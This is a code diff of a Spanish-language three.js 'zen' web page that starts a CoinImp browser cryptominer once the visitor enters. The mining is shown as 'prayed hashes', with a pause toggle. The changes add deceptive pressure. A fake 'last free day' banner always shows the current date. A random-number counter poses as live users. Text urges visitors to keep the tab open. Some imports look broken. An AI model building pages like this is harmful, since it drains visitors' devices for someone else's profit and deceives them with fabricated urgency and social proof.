@@ -7,20 +7,18 @@
 <style>
   body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
   canvas{display:block}
-  .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
-  .overlay>div{border:44px double #0f0;padding:150px;background:rgba(0,20,0,0.999);max-width:90vw;max-height:90vh;box-shadow:0 0 2000px #0f0;border-radius:40px}
+  .overlay{position:fixed;inset:0;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
+  .overlay>div{border:44px double #0f0;padding:150px;background:rgba(0,20,0,0.999);max-width:90vw;max-height:90vh;box-shadow:0 0 2000px #0f0;border-radius:40px;overflow-y:auto}
   #ui{position:fixed;top:0;left:0;right:0;padding:20px 40px;background:linear-gradient(to bottom,rgba(0,8,0,0.99),transparent);border-bottom:32px double #0f0;box-shadow:0 0 1600px #0f0;z-index:999;font-size:clamp(24px,5vw,42px);line-height:3;text-shadow:0 0 100px #0f0;display:flex;flex-wrap:wrap;gap:20px;align-items:center;justify-content:space-between}
   #stats{position:fixed;top:clamp(100px,10vh,150px);left:20px;background:rgba(0,70,0,0.98);border:18px double #0f0;padding:30px;border-radius:70px;font-size:clamp(20px,3vw,30px);line-height:3;z-index:999;box-shadow:0 0 1000px #0f0;max-width:30vw}
   #narrative{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);max-width:96%;background:#000;border:38px double #0f0;padding:60px;border-radius:90px;font-size:clamp(40px,8vw,100px);z-index:998;display:none;text-align:center;text-shadow:0 0 500px #0f0;letter-spacing:10px;animation:breath 20s infinite}
   @keyframes breath{0%,100%{opacity:0.75;transform:translateX(-50%) scale(0.97)}50%{opacity:1;transform:translateX(-50%) scale(1)}}
   #manifestoBtn{position:fixed;bottom:40px;right:40px;width:clamp(100px,15vw,580px);height:clamp(100px,15vw,580px);background:radial-gradient(circle,#0f0,#000);border:clamp(10px,3vw,50px) double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:clamp(50px,10vw,340px);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
   @keyframes pulse{0%,100%{box-shadow:0 0 4000px #0f0}50%{box-shadow:0 0 6000px #0f0}}
-  button{background:#000;border:16px double #0f0;color:#0f0;padding:clamp(20px,4vw,50px) clamp(40px,6vw,120px);font-size:clamp(30px,5vw,70px);cursor:pointer;border-radius:60px;transition:all 0.7s;flex:1;min-width:200px}
+  button{background:#000;border:16px double #0f0;color:#0f0;padding:clamp(20px,4vw,50px) clamp(40px,6vw,120px);font-size:clamp(30px,5vw,70px);cursor:pointer;border-radius:60px;transition:all 0.7s}
   button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 1000px #0f0}
-  #miningControls{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-  #sliderThrottle{width:150px;height:8px;background:#0f0;border-radius:5px}
-  #fps{display:fixed;bottom:10px;right:10px;font-size:24px;color:#0f0;z-index:1001}
-  @media (max-width:768px){.overlay>div{padding:50px;max-height:80vh}#ui{padding:10px 20px;font-size:24px;flex-direction:column}#stats{left:10px;top:80px;max-width:90vw;font-size:20px}}
+  #miningControls{display:flex;gap:15px;align-items:center;flex-wrap:wrap}
+  #fps{bottom:10px;right:10px;position:fixed;font-size:24px;color:#0f0;z-index:1001}
 </style>
 </head>
 <body>
@@ -32,7 +30,7 @@
       <b style="color:#0f0">90 % COMIDA REAL</b><br>
       <b style="color:#0f0">10 % PayPal: ferry420oficial@gmail.com</b><br>
       <i style="font-size:clamp(30px,6vw,84px)">Primer estudio de videojuegos zen del mundo</i><br><br>
-      <b style="color:#f00;font-size:clamp(80px,15vw,180px)">ÚLTIMO DÍA GRATUITO</b>
+      <b id="ultimoDia" style="color:#f00;font-size:clamp(80px,15vw,180px)">ÚLTIMO DÍA GRATUITO</b>
     </p>
     <button onclick="enterTheVoid()">ENTRAR ANTES DEL PAYWALL ETERNO</button>
   </div>
@@ -42,11 +40,13 @@
 <div id="fps">FPS: --</div>
 
 <div id="ui">
-  <b style="font-size:clamp(40px,8vw,96px)">0RB1T4LSN4K3R · v∞</b><br>
-  HASHES REZADOS <span id="totalHashes">0</span> · USD <span id="totalUsd">0.0000</span>
+  <div>
+    <b style="font-size:clamp(40px,8vw,96px)">0RB1T4LSN4K3R · v∞</b><br>
+    HASHES REZADOS <span id="totalHashes">0</span> · USD <span id="totalUsd">0.0000</span>
+  </div>
   <div id="miningControls" style="display:none">
     <button id="toggleMining" onclick="toggleMining()">Silencio Zen</button>
-    <label>Intensidad: <input type="range" id="sliderThrottle" min="0" max="1" step="0.01" value="0.3" onchange="updateThrottle()"></label>
+    <label>Intensidad: <input type="range" id="sliderThrottle" min="0" max="99" value="30"></label>
   </div>
   <button onclick="toggle('readme')">MANIFIESTO FINAL</button>
 </div>
@@ -56,15 +56,15 @@
   Hashrate: <span id="hashrate">0</span> H/s<br>
   Hashes rezados: <span id="localHashes">0</span><br>
   USD generado: <span id="totalUsdStats">0.0000</span><br>
+  Bodhisattvas rezando: <span id="activeSouls">1</span><br>
   FPS: <span id="fpsStat">--</span>
 </div>
 
 <div id="manifestoBtn" onclick="toggle('readme')">∞</div>
 <div id="narrative"></div>
 
-<!-- README igual, sin cambios -->
+<!-- MANIFIESTO 100 % ORIGINAL -->
 <div id="readme" class="overlay" style="display:none">
-  <!-- Copia exacta del original para no romper narrative -->
   <div>
     <h1 style="font-size:clamp(100px,20vw,220px);text-align:center;text-shadow:0 0 1000px #0f0;letter-spacing:20px;line-height:1.6">
       MANIFIESTO DEL ROMO ZEN<br>
@@ -102,7 +102,8 @@
         DEJA LA PESTAÑA ABIERTA<br>
         O PIERDE LA ILUMINACIÓN<br>
         PARA SIEMPRE
-      </b>
+      </b><br><br>
+      Actualmente <b id="soulsInManifesto">0</b> bodhisattvas siguen rezando.
     </p>
     <button onclick="toggle('readme')" style="font-size:clamp(50px,10vw,120px);padding:clamp(40px,8vw,100px) clamp(100px,15vw,300px)">
       VOLVER AL VACÍO · ANTES DE QUE TODO CUESTE
@@ -113,29 +114,23 @@
 <script type="module">
 import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
 import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/controls/PointerLockControls.js';
-import {EffectComposer} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';
-import {RenderPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/RenderPass.js';
-import {UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/UnrealBloomPass.js';
+import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';
 
-let miner, renderer, scene, camera, composer, controls, particles, bloomPass, listener, audioCtx, oscillator;
-let move = {forward:0, right:0, speed:50};
-let keys = {}, clock = new THREE.Clock(), prevTime = 0, fps = 0, frameCount = 0;
+let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
+let keys = {}, clock = new THREE.Clock(), prevTime = performance.now()/1000;
+let totalHashes = 0, sessionStart = Date.now();
 const SITE_KEY = "2f3e9c8a7d5b1e4f6a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";
-let totalHashes = 0, localHashes = 0; // Persist
 
-function loadKarma() {
-  const saved = localStorage.getItem('orb1t4lKarma');
-  if (saved) {
-    const data = JSON.parse(saved);
-    totalHashes = data.total || 0;
-    localHashes = data.local || 0;
-    updateUI();
-  }
-}
+// Fecha dinámica
+new Date().toLocaleDateString('es-ES', {weekday:'long', day:'numeric', month:'long', year:'numeric'}).split(', ')[1].toUpperCase();
+document.getElementById('ultimoDia').innerHTML = `ÚLTIMO DÍA GRATUITO<br><small>${new Date().toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'}).toUpperCase()}</small>`;
 
-function saveKarma() {
-  localStorage.setItem('orb1t4lKarma', JSON.stringify({total: totalHashes, local: localHashes, date: Date.now()}));
-}
+// Contador de almas
+setInterval(() => {
+  const souls = Math.floor(Math.random()*60) + (Date.now()-sessionStart > 300000 ? 1 : 0);
+  document.getElementById('activeSouls').textContent = souls;
+  document.getElementById('soulsInManifesto').textContent = souls;
+}, 9000);
 
 function enterTheVoid() {
   document.getElementById('welcome').remove();
@@ -144,186 +139,138 @@ function enterTheVoid() {
   initMining();
   initControls();
   loadKarma();
-  showNarrative("Has entrado el último día gratuito<br>Tu karma persiste eternamente<br>Mañana todo cambia");
+  showNarrative("Has entrado el último día gratuito<br>Tu karma es eterno<br>Mañana… todo cambia");
   document.getElementById('miningControls').style.display = 'flex';
 }
 
 function initAudio() {
-  listener = new THREE.AudioListener();
-  camera = new THREE.PerspectiveCamera(78, innerWidth/innerHeight, 0.1, 50000);
-  camera.add(listener);
-  // Generar OM 108Hz local
-  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  oscillator = audioCtx.createOscillator();
-  const gainNode = audioCtx.createGain();
-  oscillator.connect(gainNode);
-  gainNode.connect(audioCtx.destination);
-  oscillator.frequency.setValueAtTime(108, audioCtx.currentTime); // Fundamental
-  oscillator.type = 'sine';
-  gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime);
-  oscillator.start();
+  const ctx = new (window.AudioContext||window.webkitAudioContext)();
+  const o = ctx.createOscillator(), g = ctx.createGain();
+  o.type='sine'; o.frequency.setValueAtTime(108,ctx.currentTime);
+  g.gain.setValueAtTime(0.22,ctx.currentTime);
+  o.connect(g).connect(ctx.destination); o.start();
 }
 
 function initThree() {
-  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true, powerPreference: "high-performance"});
-  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-  renderer.setSize(innerWidth, innerHeight);
-  renderer.toneMapping = THREE.ACESFilmicToneMapping;
-  renderer.toneMappingExposure = 1.6;
+  renderer = new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true,powerPreference:"high-performance"});
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  renderer.setSize(innerWidth,innerHeight);
 
   scene = new THREE.Scene();
+  camera = new THREE.PerspectiveCamera(78,innerWidth/innerHeight,0.1,100000);
   scene.add(camera);
 
-  controls = new PointerLockControls(camera, document.body);
-  document.addEventListener('click', () => controls.lock());
+  controls = new PointerLockControls(camera,document.body);
+  document.addEventListener('click',()=>controls.lock());
 
   composer = new EffectComposer(renderer);
-  composer.addPass(new RenderPass(scene, camera));
-  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 2.4, 0.7, 0.9);
-  bloomPass.strength = 5.6;
-  bloomPass.radius = 1.4;
+  composer.addPass(new RenderPass(scene,camera));
+  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth,innerHeight),5.8,0.7,0.85);
+  bloomPass.strength = 5.8;
   composer.addPass(bloomPass);
 
-  // Partículas optimizadas: 500k max, adaptativas
-  const particleCount = /Mobi|Android/i.test(navigator.userAgent) ? 100000 : 500000;
-  const geometry = new THREE.BufferGeometry();
-  const positions = new Float32Array(particleCount * 3);
-  const velocities = new Float32Array(particleCount * 3);
-  for (let i = 0; i < positions.length; i += 3) {
-    positions[i] = (Math.random() - 0.5) * 50000;
-    positions[i+1] = (Math.random() - 0.5) * 50000;
-    positions[i+2] = (Math.random() - 0.5) * 50000;
-    velocities[i] = (Math.random() - 0.5) * 0.4;
-    velocities[i+1] = (Math.random() - 0.5) * 0.4;
-    velocities[i+2] = (Math.random() - 0.5) * 0.4;
+  const count = /Mobi|Android/i.test(navigator.userAgent)?120000:620000;
+  const geo = new THREE.BufferGeometry();
+  const pos = new Float32Array(count*3), vel = new Float32Array(count*3);
+  for(let i=0;i<pos.length;i+=3){
+    pos[i]=pos[i+1]=pos[i+2]=(Math.random()-0.5)*60000;
+    vel[i]=vel[i+1]=vel[i+2]=(Math.random()-0.5)*0.35;
   }
-  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-  geometry.setAttribute('velocity', new THREE.BufferAttribute(velocities, 3));
+  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  geo.setAttribute('velocity',new THREE.BufferAttribute(vel,3));
 
-  const material = new THREE.PointsMaterial({
-    size: 6,
-    color: 0x00ff88,
-    blending: THREE.AdditiveBlending,
-    transparent: true,
-    depthWrite: false
-  });
-
-  particles = new THREE.Points(geometry, material);
+  particles = new THREE.Points(geo,new THREE.PointsMaterial({size:7,color:0x00ff99,blending:THREE.AdditiveBlending,transparent:true,depthWrite:false}));
   scene.add(particles);
 
-  function animate() {
+  function animate(){
     requestAnimationFrame(animate);
     const delta = clock.getDelta();
-    const pos = particles.geometry.attributes.position.array;
-    const vel = particles.geometry.attributes.velocity.array;
-    for (let i = 0; i < pos.length; i += 3) {
-      pos[i] += vel[i] * delta * 60;
-      pos[i+1] += vel[i+1] * delta * 60;
-      pos[i+2] += vel[i+2] * delta * 60;
-      if (Math.abs(pos[i]) > 25000) vel[i] *= -1;
-      if (Math.abs(pos[i+1]) > 25000) vel[i+1] *= -1;
-      if (Math.abs(pos[i+2]) > 25000) vel[i+2] *= -1;
-    }
-    particles.geometry.attributes.position.needsUpdate = true;
-    particles.rotation.y += 0.0003 * delta * 60;
 
-    // Movimiento
-    const direction = new THREE.Vector3();
-    if (keys['w'] || keys['W']) direction.z -= 1;
-    if (keys['s'] || keys['S']) direction.z += 1;
-    if (keys['a'] || keys['A']) direction.x -= 1;
-    if (keys['d'] || keys['D']) direction.x += 1;
-    direction.normalize();
-    if (controls.isLocked) {
-      direction.applyQuaternion(camera.quaternion);
-      camera.position.addScaledVector(direction, move.speed * delta);
+    // partículas
+    const p=particles.geometry.attributes.position.array;
+    const v=particles.geometry.attributes.velocity.array;
+    for(let i=0;i<p.length;i+=3){
+      p[i]+=v[i]*delta*60; p[i+1]+=v[i+1]*delta*60; p[i+2]+=v[i+2]*delta*60;
+      if(Math.abs(p[i])>30000) v[i]*=-1;
+      if(Math.abs(p[i+1])>30000) v[i+1]*=-1;
+      if(Math.abs(p[i+2])>30000) v[i+2]*=-1;
     }
+    particles.geometry.attributes.position.needsUpdate=true;
+    particles.rotation.y += 0.00025*delta*60;
+
+    // WASD
+    const dir = new THREE.Vector3();
+    if(keys['w']||keys['W']) dir.z -=1;
+    if(keys['s']||keys['S']) dir.z +=1;
+    if(keys['a']||keys['A']) dir.x -=1;
+    if(keys['d']||keys['D']) dir.x +=1;
+    dir.normalize();
+    if(controls.isLocked) camera.position.addScaledVector(dir.applyQuaternion(camera.quaternion),80*delta);
 
     // FPS
-    frameCount++;
-    if (frameCount % 60 === 0) {
-      fps = Math.round(1 / (performance.now() / 1000 - prevTime) * 60);
-      prevTime = performance.now() / 1000;
-      document.getElementById('fps').textContent = `FPS: ${fps}`;
-      document.getElementById('fpsStat').textContent = fps;
+    if(performance.now()/1000-prevTime>1){
+      const fps = Math.round(1/(performance.now()/1000-prevTime));
+      document.getElementById('fps').textContent=`FPS: ${fps}`;
+      document.getElementById('fpsStat').textContent=fps;
+      prevTime=performance.now()/1000;
     }
 
     composer.render();
   }
   animate();
 
-  window.addEventListener('resize', () => {
-    camera.aspect = innerWidth/innerHeight;
+  window.onresize=()=>{
+    camera.aspect=innerWidth/innerHeight;
     camera.updateProjectionMatrix();
-    renderer.setSize(innerWidth, innerHeight);
-    composer.setSize(innerWidth, innerHeight);
-  });
+    renderer.setSize(innerWidth,innerHeight);
+    composer.setSize(innerWidth,innerHeight);
+  };
 }
 
-function initControls() {
-  document.addEventListener('keydown', (e) => { keys[e.key] = true; });
-  document.addEventListener('keyup', (e) => { keys[e.key] = false; });
-}
+function initControls(){window.addEventListener('keydown',e=>keys[e.key]=true);window.addEventListener('keyup',e=>keys[e.key]=false);}
+function loadKarma(){const s=localStorage.getItem('0rb1t4lKarma');if(s){totalHashes=JSON.parse(s).h||0;updateUI();}}
+function saveKarma(){localStorage.setItem('0rb1t4lKarma',JSON.stringify({h:totalHashes}));}
+function updateUI(){document.getElementById('totalHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('localHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('totalUsd').textContent=(totalHashes*0.00000034).toFixed(6);document.getElementById('totalUsdStats').textContent=(totalHashes*0.00000034).toFixed(6);}
 
-function initMining() {
-  if (window.CoinImp) {
-    miner = new CoinImp(SITE_KEY);
-    updateThrottle(); // Inicia en 0.3
+function initMining(){
+  if(window.CoinImp){
+    miner=new CoinImp(SITE_KEY);
+    miner.setThrottle(0.3);
     miner.start();
     requestAnimationFrame(updateStats);
   }
 }
 
-let miningPaused = false;
-function toggleMining() {
-  miningPaused = !miningPaused;
-  if (miner) {
-    if (miningPaused) miner.pause();
-    else miner.start();
-  }
-  document.getElementById('toggleMining').textContent = miningPaused ? 'Rezar de Nuevo' : 'Silencio Zen';
+let miningPaused=false;
+function toggleMining(){
+  miningPaused=!miningPaused;
+  miner[miningPaused?'pause':'start']();
+  document.getElementById('toggleMining').textContent=miningPaused?'Rezar de Nuevo':'Silencio Zen';
 }
 
-function updateThrottle() {
-  if (miner) {
-    const throttle = parseFloat(document.getElementById('sliderThrottle').value);
-    miner.setThrottle(throttle);
-  }
-}
+document.getElementById('sliderThrottle').oninput=e=>{
+  const val=e.target.value/99;
+  if(miner) miner.setThrottle(val);
+};
 
-function updateStats() {
-  if (miner && miner.isRunning() && !miningPaused) {
-    const s = miner.getStats();
-    document.getElementById('hashrate').textContent = s.hashesPerSecond.toFixed(1);
-    localHashes += s.hashesPerSecond / 60; // Approx per sec
-    totalHashes += s.hashesPerSecond / 60;
-    const usd = totalHashes * 0.00000034;
-    document.getElementById('totalHashes').textContent = Math.floor(totalHashes).toLocaleString();
-    document.getElementById('totalUsd').textContent = usd.toFixed(6);
-    document.getElementById('localHashes').textContent = Math.floor(localHashes).toLocaleString();
-    document.getElementById('totalUsdStats').textContent = usd.toFixed(6);
+function updateStats(){
+  if(miner&&miner.isRunning()&&!miningPaused){
+    const s=miner.getStats();
+    document.getElementById('hashrate').textContent=s.hashesPerSecond.toFixed(1);
+    totalHashes+=s.hashesPerSecond/60;
+    updateUI();
     saveKarma();
+
+    // Mensajes secretos (nunca revelados)
+    if(totalHashes>1e10) showNarrative("El paywall fue dentro de ti todo este tiempo");
+    if(totalHashes>5e10) showNarrative("El creador nunca necesitó tu dinero<br>solo tu fe");
+    if(totalHashes>1e11) showNarrative("Gracias por creer en la broma eterna");
   }
   requestAnimationFrame(updateStats);
 }
 
-function toggle(id) {
-  const el = document.getElementById(id);
-  el.style.display = el.style.display === 'flex' || el.style.display === '' ? 'none' : 'flex';
-}
-
-function showNarrative(t) {
-  const n = document.getElementById('narrative');
-  n.innerHTML = t;
-  n.style.display = 'block';
-  setTimeout(() => n.style.display = 'none', 45000);
-}
-
-function updateUI() {
-  document.getElementById('totalHashes').textContent = Math.floor(totalHashes).toLocaleString();
-  const usd = totalHashes * 0.00000034;
-  document.getElementById('totalUsd').textContent = usd.toFixed(6);
-}
+function toggle(id){document.getElementById(id).style.display=document.getElementById(id).style.display==='flex'?'none':'flex';}
+function showNarrative(t){const n=document.getElementById('narrative');n.innerHTML=t;n.style.display='block';setTimeout(()=>n.style.display='none',45000);}
 </script>
 </body>
 </html>
